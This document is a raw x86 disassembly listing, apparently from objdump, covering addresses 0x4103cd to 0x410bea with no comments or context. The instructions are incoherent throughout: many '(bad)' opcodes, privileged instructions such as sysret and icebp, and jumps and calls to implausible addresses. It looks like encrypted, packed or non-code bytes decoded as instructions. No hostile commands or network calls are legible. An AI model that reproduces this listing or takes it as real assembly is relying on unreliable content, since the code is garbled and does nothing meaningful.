  4103cd:	cmp    edi,DWORD PTR [ebx]
  4103cf:	je     0x4103e0
  4103d1:	push   ebx
  4103d2:	loopne 0x4103e3
  4103d4:	dec    ecx
  4103d6:	mov    esp,DWORD PTR [ebp-0x1c]
  4103d9:	int    0xf1
  4103db:	mov    esi,0x703084d
  4103e0:	pcmpgtd mm6,mm1
  4103e3:	add    BYTE PTR [ebp+0x66],dh
  4103e6:	jmp    0x4103b3
  4103e8:	mov    eax,DWORD PTR [ebx]
  4103ea:	lock push ebp
  4103ec:	ror    DWORD PTR [ebp-0x2972feb3],1
  4103f2:	or     bh,dl
  4103f4:	jb     0x4103f4
  4103f6:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4103fc:	loopne 0x4103fe
  4103fe:	jne    0x410402
  410400:	data16 add BYTE PTR [esi+eiz*2],dh
  410404:	mov    ecx,ebx
  410406:	data16 cmp al,0xf1
  410409:	add    BYTE PTR [esi+eiz*2],bh
  41040c:	add    bl,cl
  41040e:	retw   0xf2
  410412:	ret    0x66
  410415:	retf   
  410416:	enterw 0x4df1,0x19
  41041b:	pop    edi
  41041c:	jne    0x41039f
  41041e:	mov    esi,DWORD PTR [eax]
  410420:	call   0x77b58fc1
  410425:	xor    ebp,DWORD PTR [ebx]
  410427:	lea    esp,[esi+0x48]
  41042a:	repnz in eax,0x3b
  41042d:	add    BYTE PTR [ebp-0x37],dh
  410430:	xor    edx,DWORD PTR [ebp-0x15]
  410433:	in     al,dx
  410434:	xor    edx,DWORD PTR [esi+0x40]
  410437:	mov    DWORD PTR [edi],0x338545fc
  41043d:	clc    
  41043e:	add    esi,DWORD PTR [ecx]
  410440:	pop    edi
  410441:	pushf  
  410442:	pop    ebx
  410443:	call   0xff42040a
  410448:	mov    edi,eax
  41044a:	push   ecx
  41044b:	pop    es
  41044c:	mov    edi,DWORD PTR [eax]
  41044e:	push   esi
  41044f:	inc    esi
  410450:	add    bh,BYTE PTR [esi+0x0]
  410453:	popa   
  410454:	data16 (bad) 
  410456:	into   
  410457:	gs cmp al,0xcd
  41045a:	add    BYTE PTR [ecx+0x7ce0866],bh
  410460:	ret    0x66
  410463:	add    bh,al
  410465:	add    bh,ah
  410467:	add    BYTE PTR [ebp+0x31c3f866],al
  41046d:	cmp    al,0x9c
  41046f:	add    BYTE PTR [esi+0x66],ah
  410472:	into   
  410473:	ret    
  410474:	pop    ebp
  410475:	adc    BYTE PTR [edi+0x0],dl
  410478:	mov    bh,0x66
  41047a:	mov    edi,0xff038dc3
  41047f:	jne    0x4104d5
  410481:	lea    edx,[ecx+0x1]
  410484:	mov    ebx,0xd64ff1
  410489:	sar    DWORD PTR [ebx],1
  41048b:	test   BYTE PTR [ebp+0x36],dh
  41048e:	mov    DWORD PTR [esp+edi*8-0x76],esp
  410492:	push   edi
  410493:	xor    BYTE PTR [ebx],0x38
  410496:	mov    esi,ebx
  410498:	xor    eax,DWORD PTR [eax-0x3c73819a]
  41049e:	ss inc ebp
  4104a0:	fs pop ebx
  4104a2:	mov    ebx,0x9c3b30
  4104a7:	je     0x4104d4
  4104a9:	xor    edi,DWORD PTR [ebx+0x668a33]
  4104af:	mov    WORD PTR [ebx],?
  4104b1:	ss mov ebx,0x8b4e64
  4104b7:	pop    edi
  4104b8:	cmp    ecx,ecx
  4104ba:	jne    0x410511
  4104bc:	mov    ebp,esp
  4104be:	cld    
  4104bf:	push   esi
  4104c0:	pop    ebx
  4104c1:	inc    ebp
  4104c2:	stc    
  4104c3:	xor    BYTE PTR [ebp+0x9bef89c],al
  4104c9:	test   esi,ecx
  4104cb:	clc    
  4104cc:	test   dl,dl
  4104ce:	cmp    bh,bh
  4104d0:	fs pop si
  4104d3:	or     bl,al
  4104d5:	add    cl,BYTE PTR [ebx+0x57665100]
  4104db:	retf   0x3c45
  4104de:	xor    BYTE PTR [eax],al
  4104e0:	pushf  
  4104e1:	mov    si,0x85ca
  4104e5:	ret    0xf8
  4104e8:	pop    ebx
  4104e9:	dec    dx
  4104ec:	mov    edx,DWORD PTR [edi-0x76]
  4104ef:	push   edi
  4104f0:	add    al,0xb7
  4104f2:	xor    al,0xba
  4104f4:	cmp    al,0x8d
  4104f6:	je     0x4104f7
  4104f8:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4104fc:	lea    edi,[ebx+0x544fff]
  410502:	push   ecx
  410503:	cmp    edx,DWORD PTR [ebx+0x75]
  410506:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41050c:	add    BYTE PTR [ebx],dh
  41050e:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410514:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  41051b:	mov    ebx,0x3b3b00
  410520:	jne    0x41054d
  410522:	mov    DWORD PTR [ebx+0x728afc],edi
  410528:	xor    esi,DWORD PTR [ebx]
  41052a:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410530:	push   edi
  410531:	cmp    esp,ebp
  410533:	jne    0x410535
  410535:	sbb    DWORD PTR [eax],0x8085c3fc
  41053b:	clc    
  41053c:	inc    esi
  41053d:	pop    ebx
  41053e:	sti    
  41053f:	add    eax,0xeb8bc075
  410544:	cld    
  410545:	xor    edi,DWORD PTR ds:0xf8c3855e
  41054b:	mov    ecx,DWORD PTR [ecx+edx*2]
  41054e:	rol    DWORD PTR [ebp-0x37],0xf
  410552:	mov    DWORD PTR [eax],ecx
  410554:	inc    edi
  410555:	(bad)  
  410556:	in     eax,0xfe
  410558:	add    bh,bh
  41055a:	(bad)  
  41055b:	mov    esi,0xc38a5e
  410560:	mov    esi,DWORD PTR [ebx]
  410562:	push   ecx
  410563:	mov    edi,0xfc4ec7
  410568:	test   DWORD PTR [ebp-0x8],edx
  41056b:	xor    di,ax
  41056e:	pushf  
  41056f:	sub    ebp,eax
  410571:	inc    ebp
  410572:	(bad)  
  410573:	sub    edi,edi
  410575:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  41057b:	inc    ebp
  41057c:	add    BYTE PTR [esi+0x2b],ah
  41057f:	or     bh,BYTE PTR [edx+0xf8ac2]
  410585:	cmp    al,0x33
  410587:	mov    edi,DWORD PTR [edx+0xfe4e81]
  41058d:	(bad)  
  41058e:	cmp    esi,DWORD PTR [ebx]
  410590:	je     0x41054a
  410592:	push   ebx
  410593:	dec    esi
  410594:	str    ecx
  410597:	cmp    esp,DWORD PTR [ebp+0x75]
  41059a:	int    0x33
  41059c:	mov    edi,0x789085f
  4105a1:	mov    edx,DWORD PTR [eax]
  4105a3:	cld    
  4105a4:	add    cl,cl
  4105a6:	data16 add al,0xcb
  4105a9:	push   ebp
  4105aa:	add    ebp,esp
  4105ac:	jne    0x41059a
  4105ae:	(bad)  
  4105af:	mov    DWORD PTR [ecx],0xd685f7ec
  4105b5:	clc    
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	inc    ebp
  4105b8:	mov    esi,DWORD PTR [edx]
  4105ba:	push   eax
  4105bb:	pushf  
  4105bc:	in     eax,0x8b
  4105be:	add    ah,ch
  4105c0:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4105c4:	add    ax,0x72cb
  4105c8:	cmp    al,0x0
  4105ca:	add    BYTE PTR [ebp+0x66],al
  4105cd:	(bad)  
  4105ce:	retf   
  4105cf:	lock ret 0x85
  4105d3:	clc    
  4105d4:	inc    bp
  4105d6:	retf   
  4105d7:	cmp    eax,0xc77d9cc8
  4105dc:	xor    ah,bh
  4105de:	pushf  
  4105df:	test   DWORD PTR [edi-0x8],ebx
  4105e2:	je     0x410629
  4105e4:	xor    esi,DWORD PTR ds:0x7020840
  4105ea:	ror    BYTE PTR [ebp-0x37],0x8d
  4105ee:	push   ebp
  4105ef:	add    esp,ebp
  4105f1:	jb     0x41057e
  4105f3:	add    BYTE PTR [eax],cl
  4105f5:	dec    ebp
  4105f6:	mov    bh,0x81
  4105f8:	push   esi
  4105f9:	push   esp
  4105fa:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  410601:	xor    al,BYTE PTR [eax]
  410603:	mov    edx,DWORD PTR [edi+0x10]
  410606:	(bad)  
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	ret    0x3b
  41060b:	jns    0x3b4202fe
  410611:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410615:	dec    ebp
  410616:	or     BYTE PTR [ebx],ch
  410618:	ret    0x458b
  41061b:	lock jmp 0x41060f
  41061e:	mov    ecx,DWORD PTR [eax]
  410620:	or     BYTE PTR [edi],al
  410622:	mov    ecx,eax
  410624:	xor    DWORD PTR [edx+0x2],0x0
  410628:	mov    bh,0xc1
  41062a:	adc    BYTE PTR [eax],dh
  41062c:	iret   
  41062d:	inc    ebp
  41062e:	mov    DWORD PTR [ebx],0x4dfff8c4
  410634:	inc    BYTE PTR [ebx]
  410636:	ret    0xf8
  410639:	adc    DWORD PTR [esi+0x10],esp
  41063c:	clc    
  41063d:	dec    ecx
  41063e:	fisttp WORD PTR [ecx+0x456604c0]
  410644:	add    dh,BYTE PTR ds:0x75e0845
  41064a:	ret    0x4d
  41064d:	lea    ecx,[ebx+0x18728301]
  410653:	add    BYTE PTR [ebp+0x45],al
  410656:	xor    ecx,ebp
  410658:	pushf  
  410659:	add    bh,al
  41065b:	add    al,ch
  41065d:	inc    ebp
  41065e:	test   DWORD PTR [ebx-0x3eba0708],ecx
  410664:	xor    eax,0x781084d
  410669:	push   esp
  41066a:	fwait
  41066b:	push   ecx
  41066c:	xor    al,BYTE PTR [ecx+0x32f89b89]
  410672:	inc    ebp
  410673:	cmp    edi,DWORD PTR [ecx]
  410675:	jbe    0x410613
  410677:	mov    eax,edi
  410679:	or     ah,dh
  41067b:	inc    ebp
  41067c:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  410682:	xor    ecx,DWORD PTR [ebx-0x74747664]
  410688:	in     al,dx
  410689:	hlt    
  41068a:	push   esp
  41068b:	push   esp
  41068c:	push   ecx
  41068d:	push   ecx
  41068e:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  410694:	fwait
  410695:	fwait
  410696:	xor    dh,BYTE PTR [edx]
  410698:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  41069e:	or     BYTE PTR [ebp+0x7],al
  4106a1:	mov    eax,ecx
  4106a3:	clc    
  4106a4:	jb     0x410667
  4106a6:	add    BYTE PTR [ebp+0x55],cl
  4106a9:	or     DWORD PTR [edi],0xc251d154
  4106af:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4106b9:	mov    edi,eax
  4106bb:	or     cl,al
  4106bd:	inc    ebp
  4106be:	dec    ebp
  4106bf:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4106c5:	or     WORD PTR [ecx],0x899b
  4106ca:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4106d0:	mov    edx,DWORD PTR [ecx+0x8]
  4106d3:	mov    eax,DWORD PTR [ebp-0x8]
  4106d6:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4106dd:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4106e3:	inc    ebp
  4106e4:	dec    eax
  4106e5:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4106eb:	add    edx,DWORD PTR [ecx-0x8]
  4106ee:	mov    ecx,DWORD PTR [ecx]
  4106f0:	clc    
  4106f1:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4106f8:	mov    ecx,ebp
  4106fa:	clc    
  4106fb:	(bad)  
  4106fc:	popf   
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	ret    0x8b
  410702:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  410708:	mov    edi,esp
  41070a:	hlt    
  41070b:	test   ecx,esi
  41070d:	clc    
  41070e:	or     BYTE PTR [ebp+0x7],al
  410711:	xor    al,cl
  410713:	pushf  
  410714:	jb     0x410749
  410716:	add    BYTE PTR [eax-0x3f],al
  410719:	inc    eax
  41071a:	daa    
  41071b:	inc    ebp
  41071c:	inc    ebp
  41071d:	xor    eax,0x7f80803
  410722:	dec    ebp
  410723:	fwait
  410724:	add    esi,DWORD PTR [edx]
  410726:	clc    
  410727:	cmp    DWORD PTR [ecx],ecx
  410729:	or     al,0x8
  41072b:	add    al,BYTE PTR [ebp+0x2c]
  41072e:	xor    eax,0x7350845
  410733:	or     BYTE PTR [ebp+0x7],cl
  410736:	lea    ebx,[ebx-0x748dcdff]
  41073c:	add    BYTE PTR [eax*2-0x74b21438],cl
  410743:	mov    edx,DWORD PTR [eax]
  410745:	cld    
  410746:	dec    ebp
  410747:	push   esp
  410748:	sub    edx,DWORD PTR [ecx-0x75]
  41074b:	add    eax,0xf172fc
  410750:	or     BYTE PTR [ebp+0x7],cl
  410753:	add    eax,ecx
  410755:	or     al,0x72
  410757:	add    DWORD PTR [eax],eax
  410759:	mov    ebx,0x29c2c1
  41075e:	inc    ebp
  41075f:	mov    eax,DWORD PTR [ebx]
  410761:	cmp    eax,0x3004d1c
  410767:	xbegin 0x66c69361
  41076d:	clc    
  41076e:	or     BYTE PTR [ebp+0x45],al
  410771:	xor    dh,BYTE PTR ds:0x78b089c
  410777:	adc    BYTE PTR [ebp+0x45],cl
  41077a:	lea    eax,[ebp+0x33727501]
  410780:	add    cl,ch
  410782:	inc    ebp
  410783:	add    bl,ch
  410785:	add    BYTE PTR [ebx+0x45850845],cl
  41078b:	je     0x410718
  41078d:	push   ebx
  41078e:	or     al,0x85
  410790:	dec    ebp
  410791:	std    
  410792:	mov    bh,bh
  410794:	mov    BYTE PTR [ebp-0x75],al
  410797:	mov    edi,eax
  410799:	or     al,0x89
  41079b:	inc    ebp
  41079c:	clc    
  41079d:	mov    esp,esp
  41079f:	hlt    
  4107a0:	call   DWORD PTR [edi-0x37]
  4107a3:	push   esp
  4107a4:	or     al,0x51
  4107a6:	push   ebp
  4107a7:	xor    ebp,esp
  4107a9:	mov    esi,0x457251
  4107ae:	xor    esi,eax
  4107b0:	pushf  
  4107b1:	inc    ebp
  4107b2:	(bad)  
  4107b3:	mov    edi,eax
  4107b5:	or     al,0x85
  4107b7:	add    al,bh
  4107b9:	inc    eax
  4107bb:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4107bf:	or     ah,bh
  4107c1:	inc    eax
  4107c2:	push   esp
  4107c3:	jmp    0x410816
  4107c5:	mov    eax,DWORD PTR ds:0xe8720c
  4107cb:	mov    DWORD PTR [ebp-0x8],eax
  4107ce:	jne    0x410815
  4107d0:	jmp    0x41075d
  4107d2:	mov    ebp,DWORD PTR [eax]
  4107d4:	clc    
  4107d5:	retf   0xff54
  4107d8:	push   ecx
  4107d9:	mov    DWORD PTR ds:0x757210,eax
  4107df:	mov    ecx,DWORD PTR [ebp-0x4]
  4107e2:	sub    esp,DWORD PTR [ebx-0x77]
  4107e5:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4107ec:	or     ah,bh
  4107ee:	pop    es
  4107ef:	ds fwait
  4107f1:	push   DWORD PTR [edx]
  4107f3:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4107f9:	(bad)  
  4107fa:	mov    bh,bh
  4107fc:	jmp    0x4107ea
  4107fe:	leave  
  4107ff:	jne    0x410809
  410801:	call   0x2e015b
  410806:	in     al,dx
  410807:	dec    ebp
  410808:	add    dh,BYTE PTR [ebx]
  41080a:	add    BYTE PTR [ebx],al
  41080c:	inc    ebp
  41080d:	cmp    esi,DWORD PTR [ecx]
  41080f:	je     0x4107ad
  410811:	mov    eax,edi
  410813:	or     al,0xf0
  410815:	add    BYTE PTR [ebp+0x458bf845],al
  41081b:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410821:	adc    al,0x7
  410823:	enter  0x9fc0,0xa5
  410827:	rol    BYTE PTR [eax],0x5e
  41082a:	mov    ecx,ecx
  41082c:	or     al,0xc
  41082e:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410835:	jmp    0x410836
  410837:	push   ebp
  410838:	mov    esp,ebp
  41083a:	cld    
  41083b:	inc    ebp
  41083c:	inc    ebp
  41083d:	or     DWORD PTR [ecx+0x457dec10],0x0
  410844:	push   esi
  410845:	push   esi
  410846:	mov    edi,0x7af080f
  41084b:	add    bh,al
  41084d:	test   DWORD PTR [ebx+0x3a7320f],ebx
  410853:	add    BYTE PTR [ecx+0x4540100f],cl
  410859:	mov    ebp,eax
  41085b:	mov    ebp,edi
  41085d:	lock call edx
  410860:	fcom   DWORD PTR [ebp+0x45]
  410863:	mov    eax,0x148a8b
  410868:	push   ecx
  410869:	enter  0xc145,0x83
  41086d:	cmp    ecx,DWORD PTR [eax]
  41086f:	add    BYTE PTR [ebp+0x4d],al
  410872:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  410878:	call   0xffa103e7
  41087d:	cmp    eax,DWORD PTR [ebp-0xc]
  410880:	jmp    DWORD PTR [eax+edx*1-0x4e]
  410884:	push   ebp
  410885:	(bad)  
  410886:	call   0x32068a
  41088b:	mov    bh,0xdb
  41088d:	cld    
  41088e:	or     BYTE PTR [ebp+0x45],bl
  410891:	(bad)  
  410892:	call   0xff7b0522
  410897:	add    al,BYTE PTR [ebp+0x37]
  41089a:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  4108a0:	jne    0x4108a2
  4108a2:	(bad)  
  4108a3:	cmp    edi,esp
  4108a5:	jne    0x4108d8
  4108a7:	mov    edi,edi
  4108a9:	or     BYTE PTR [ebx-0x307f0b49],cl
  4108af:	pop    ds
  4108b0:	into   
  4108b1:	je     0x410874
  4108b3:	mov    ebx,DWORD PTR [esi]
  4108b5:	or     BYTE PTR [ebp-0x49],al
  4108b8:	mov    esp,DWORD PTR [esi-0x77]
  4108bb:	mov    esi,0x2451f0c
  4108c0:	mov    eax,DWORD PTR [eax]
  4108c2:	or     al,0x66
  4108c4:	sar    bl,0x3b
  4108c7:	xor    esi,DWORD PTR [ebp+0x66]
  4108ca:	xor    ecx,edi
  4108cc:	pop    edi
  4108cd:	adc    bl,BYTE PTR [ebx+0x7e]
  4108d0:	ret    0xff
  4108d3:	cld    
  4108d4:	inc    ebp
  4108d5:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4108db:	cld    
  4108dc:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4108e3:	push   0xffffff83
  4108e5:	pop    edi
  4108e6:	or     BYTE PTR [ebp+0x53],dh
  4108e9:	xorps  xmm1,xmm2
  4108ec:	test   BYTE PTR [eax+eax*1],bh
  4108ef:	add    BYTE PTR [eax],al
  4108f1:	adc    eax,eax
  4108f3:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4108fb:	jmp    DWORD PTR [eax]
  4108fd:	ror    al,0x5e
  410900:	inc    ebp
  410901:	leave  
  410902:	xor    ecx,DWORD PTR [eax]
  410904:	and    DWORD PTR [ebx-0x3ec30708],ecx
  41090a:	add    ah,al
  41090c:	xor    edi,edi
  41090e:	xor    DWORD PTR [ebx],0x66003302
  410914:	mov    DWORD PTR [ebp-0xc],ecx
  410917:	pcmpgtw mm0,mm0
  41091a:	add    dl,ah
  41091c:	leave  
  41091d:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  410921:	push   eax
  410922:	dec    ebp
  410923:	mov    esi,DWORD PTR [ebx-0x75]
  410926:	lea    ebp,[eax-0x7c00ff02]
  41092c:	xor    eax,DWORD PTR [eax]
  41092e:	sysret 
  410930:	dec    ebp
  410931:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410938:	push   WORD PTR [ecx+0x8]
  41093c:	jne    0x4108ff
  41093e:	ud0    ecx,DWORD PTR [ecx]
  410941:	mov    eax,edx
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	add    BYTE PTR [eax],al
  410946:	data16 (bad) 
  410948:	iret   
  410949:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410950:	cli    
  410951:	inc    ebp
  410952:	cmp    al,0x8d
  410954:	add    BYTE PTR [esi+0x2d],ah
  410957:	inc    ebp
  410958:	pop    ebp
  410959:	lea    ecx,[edi]
  41095b:	mov    dl,bh
  41095d:	add    BYTE PTR [edi],cl
  41095f:	mov    DWORD PTR [eax+eax*8],edi
  410962:	mov    ebx,0x3b87
  410967:	add    BYTE PTR [ebx],ch
  410969:	inc    ebp
  41096a:	data16 (bad) 
  41096c:	clc    
  41096d:	int3   
  41096e:	cmp    eax,DWORD PTR [eax]
  410970:	je     0x4108fb
  410972:	push   0xffffffc8
  410974:	pop    edi
  410975:	xchg   DWORD PTR [ebp+0x0],eax
  410978:	data16 add BYTE PTR [ebp+0x45],cl
  41097c:	lea    cx,[ebp+0x10]
  410980:	jb     0x410982
  410982:	jmp    0x41090d
  410984:	call   eax
  410986:	clc    
  410987:	xchg   DWORD PTR [edi+0x1],edi
  41098a:	mov    eax,DWORD PTR [eax]
  41098c:	or     BYTE PTR [ebp-0x49],al
  41098f:	lea    eax,[eax+0x74003154]
  410995:	push   edi
  410996:	inc    edx
  410997:	jge    0x410998
  410999:	mov    DWORD PTR [edi],ecx
  41099b:	fdiv   DWORD PTR [edi-0x6]
  41099e:	inc    DWORD PTR [eax]
  4109a0:	xor    edx,DWORD PTR [eax+0x5f]
  4109a3:	xchg   DWORD PTR [ebx+0x1],ebx
  4109a6:	ret    0x0
  4109a9:	xor    BYTE PTR [ebp-0x51],cl
  4109ac:	cmp    edi,0xf0ff89fe
  4109b2:	data16 ror al,0x84
  4109b6:	rol    BYTE PTR [eax],0x3b
  4109b9:	add    al,dh
  4109bb:	dec    eax
  4109bc:	xchg   esp,eax
  4109bd:	push   ebx
  4109be:	jmp    0x41094b
  4109c0:	push   ebp
  4109c1:	add    esp,ebp
  4109c3:	add    ebp,esp
  4109c5:	mov    edx,DWORD PTR [edi+0x24]
  4109c8:	clc    
  4109c9:	dec    esi
  4109ca:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  4109d0:	cmp    BYTE PTR [ebx],al
  4109d2:	jne    0x41095d
  4109d4:	xor    esp,eax
  4109d6:	jmp    0x440b59
  4109db:	add    ebp,DWORD PTR [ecx+ecx*4]
  4109de:	jne    0x4109d4
  4109e0:	call   0xffcb073a
  4109e5:	clc    
  4109e6:	xchg   edi,eax
  4109e7:	sti    
  4109e8:	add    DWORD PTR [ebx],eax
  4109ea:	add    BYTE PTR [ebp+0x47],bl
  4109ed:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4109f3:	pop    ebp
  4109f4:	mov    DWORD PTR [esi-0x48],esi
  4109f7:	jmp    0x410a40
  4109f9:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4109ff:	(bad)  
  410a01:	cmp    al,0x0
  410a03:	cmp    eax,DWORD PTR [ebp+0x18]
  410a06:	lea    ebx,[ebp-0x56]
  410a09:	jle    0x410a0b
  410a0b:	jae    0x410996
  410a0d:	mov    eax,esp
  410a0f:	call   0xb900:0x8b005587
  410a16:	inc    ebp
  410a17:	push   ebp
  410a18:	lea    ecx,[ebp-0x27ff4f12]
  410a1e:	mov    eax,edi
  410a20:	int3   
  410a21:	push   ebp
  410a22:	xchg   edi,eax
  410a24:	add    esp,ebp
  410a26:	add    BYTE PTR [eax],al
  410a28:	inc    ebp
  410a29:	add    BYTE PTR [ebp+0x8b3255],cl
  410a2f:	cld    
  410a30:	mov    DWORD PTR [edx],edi
  410a32:	aam    0x75
  410a34:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410a3a:	mov    DWORD PTR [ebx-0x50],edx
  410a3d:	test   BYTE PTR [ebp-0x1],0xe8
  410a41:	mov    eax,DWORD PTR [eax]
  410a43:	hlt    
  410a44:	add    al,al
  410a46:	mov    eax,DWORD PTR ds:0x890045a8
  410a4c:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410a52:	inc    DWORD PTR [eax*2+0xf75854d]
  410a59:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410a5f:	call   0x729767a0
  410a64:	je     0x410ac4
  410a66:	js     0x410ac7
  410a68:	lock ret 0x7e
  410a6c:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410a72:	mov    edi,edi
  410a74:	sbb    al,bl
  410a76:	clc    
  410a77:	add    BYTE PTR [ebp-0x73],bh
  410a7a:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410a80:	ror    BYTE PTR [eax],1
  410a82:	dec    ebp
  410a83:	xchg   ebp,eax
  410a84:	mov    edi,edi
  410a86:	in     al,0x8b
  410a88:	jge    0x410a13
  410a8a:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410a90:	clc    
  410a91:	pop    esi
  410a92:	fist   DWORD PTR [ebp+0x5d398b5d]
  410a98:	clc    
  410a99:	add    al,0x6e
  410a9b:	mov    eax,DWORD PTR [ebx]
  410a9d:	mov    BYTE PTR [ebp+0x0],dl
  410aa0:	mov    edx,DWORD PTR [ebx-0x20]
  410aa3:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  410aa9:	add    eax,0x3b3b73
  410aae:	adc    al,0x89
  410ab0:	pop    eax
  410ab1:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410ab5:	ret    0xf08
  410ab8:	cmp    al,0x2
  410aba:	mov    edx,eax
  410abc:	cld    
  410abd:	add    BYTE PTR [ebp+0x66],dl
  410ac0:	add    eax,ebx
  410ac2:	add    esp,eax
  410ac4:	sub    eax,eax
  410ac6:	or     BYTE PTR [ecx-0x77f474bb],cl
  410acc:	add    BYTE PTR [eax],al
  410ace:	mov    DWORD PTR [ebx-0x24],ebx
  410ad1:	push   edi
  410ad2:	push   ebp
  410ad3:	clc    
  410ad4:	add    DWORD PTR [esi+0x1b0100],0x45
  410adb:	out    0xff,eax
  410add:	add    edx,DWORD PTR [eax]
  410adf:	jmp    0x410ac9
  410ae1:	cmp    ch,0x46
  410ae4:	(bad)  
  410ae5:	jmp    0x40c69337
  410aea:	je     0x410a76
  410aec:	mov    eax,DWORD PTR [eax-0x10c78104]
  410af2:	inc    ebp
  410af3:	add    BYTE PTR [ebx-0x770375],al
  410af9:	add    ah,ch
  410afb:	add    edx,esp
  410afd:	pop    edi
  410afe:	pop    ebp
  410aff:	push   ebp
  410b00:	inc    ebx
  410b01:	in     al,dx
  410b02:	pop    ebp
  410b03:	in     al,dx
  410b04:	cmp    edx,DWORD PTR [edi-0x8]
  410b07:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  410b0e:	add    al,0x47
  410b10:	push   ebp
  410b11:	mov    esp,ebp
  410b13:	in     al,0x45
  410b15:	dec    ebp
  410b16:	push   esi
  410b17:	test   DWORD PTR [eax+0xfb010f],esi
  410b1d:	add    BYTE PTR [eax+0xc018b],dh
  410b23:	leave  
  410b24:	inc    ebp
  410b25:	test   al,ch
  410b27:	add    dh,bh
  410b29:	add    bh,bh
  410b2b:	dec    ebp
  410b2c:	push   cs
  410b2d:	mov    DWORD PTR [ecx],eax
  410b2f:	hlt    
  410b30:	push   es
  410b31:	dec    ebp
  410b32:	leave  
  410b33:	mov    DWORD PTR [eax],ecx
  410b35:	clc    
  410b36:	cmovge eax,ecx
  410b39:	mov    ecx,0x85c2f0
  410b3f:	clc    
  410b40:	pop    DWORD PTR [ebp+0x1]
  410b43:	push   ebx
  410b44:	add    BYTE PTR [ebp-0x15],bh
  410b47:	push   esi
  410b48:	xor    eax,0x898a45
  410b4d:	cld    
  410b4e:	add    al,BYTE PTR [ebp+0x0]
  410b51:	xor    esp,DWORD PTR [esi-0x64]
  410b54:	add    DWORD PTR [esi+0x78308c1],edi
  410b5a:	add    ah,BYTE PTR [ebp-0x49]
  410b5d:	int    0xbb
  410b5f:	mov    ecx,DWORD PTR [esi+0xc]
  410b62:	add    dh,al
  410b64:	cmp    ecx,ebx
  410b66:	jne    0x410b30
  410b68:	xor    ecx,DWORD PTR [ebp+0x66]
  410b6b:	jmp    0xc80b71
  410b70:	add    DWORD PTR [ebp+0x0],eax
  410b73:	mov    eax,ebx
  410b75:	or     al,0x8b
  410b77:	(bad)  
  410b78:	mov    ecx,esi
  410b7a:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  410b81:	mov    eax,edi
  410b83:	or     BYTE PTR [edx],cl
  410b85:	shl    cl,cl
  410b87:	icebp  
  410b88:	add    BYTE PTR [ebp+0x38],0x8b
  410b8c:	or     BYTE PTR [edx+eax*2],cl
  410b8f:	(bad)  
  410b90:	or     cl,dh
  410b92:	stc    
  410b93:	shl    DWORD PTR [ebp-0x30],0xc6
  410b97:	xor    al,0x0
  410b99:	inc    ebp
  410b9a:	xchg   BYTE PTR [ebx],al
  410b9c:	add    esp,edi
  410b9e:	add    BYTE PTR [ebp-0x39],cl
  410ba1:	mov    al,bl
  410ba3:	test   DWORD PTR [ebx+0x1c348375],ecx
  410ba9:	sub    al,0xbf
  410bab:	jmp    0x410b32
  410bad:	mov    edi,eax
  410baf:	lock jge 0x410ba3
  410bb2:	lea    esi,[edx-0x74bad5ff]
  410bb8:	mov    ebp,esp
  410bba:	or     cl,dh
  410bbc:	leave  
  410bbd:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  410bc4:	dec    ebp
  410bc5:	dec    ebp
  410bc6:	test   DWORD PTR [ebx],eax
  410bc8:	paddb  mm6,mm0
  410bcb:	add    DWORD PTR [eax],eax
  410bcd:	dec    ebp
  410bce:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  410bd4:	mov    esi,DWORD PTR [edx]
  410bd6:	or     al,0x2b
  410bd8:	dec    ebp
  410bd9:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410bdf:	mov    esp,edi
  410be1:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410be8:	mov    DWORD PTR [ebx],ebp
  410bea:	call   0xc74951a
